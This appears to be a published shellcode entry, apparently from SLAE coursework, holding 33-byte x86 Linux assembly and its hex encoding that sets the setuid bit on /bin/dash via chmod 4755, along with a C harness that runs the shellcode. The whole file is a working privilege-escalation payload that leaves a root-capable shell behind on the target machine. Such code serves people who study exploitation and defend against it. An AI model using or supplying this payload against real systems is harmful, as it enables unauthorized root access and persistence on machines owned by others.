/*

Title: chmod 4755 /bin/dash
Author: absolomb
Website: https://www.sploitspren.com
SLAE-ID: 1208
Purpose: setuid bit on /bin/dash
Tested On: Ubuntu 14.04
Arch: x86
Size: 33 bytes

global _start

section .text

_start:

    cdq			; edx to 0
    push edx		; terminating NULL
    push 0x68736164	; 'hsad'
    push 0x2f6e6962	; '/nib'
    push 0x2f2f2f2f	; '////'
    mov ebx, esp	; point ebx to stack
    mov cx, 0x9ed	; 4755
    push 0xf		; chmod()
    pop eax
    int 0x80		; execute chmod()
    push 0x1		; exit()
    pop eax
    int 0x80		; execute exit()
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x99\x52\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x66\xb9\xed\x09\x6a\x0f\x58\xcd\x80\x6a\x01\x58\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}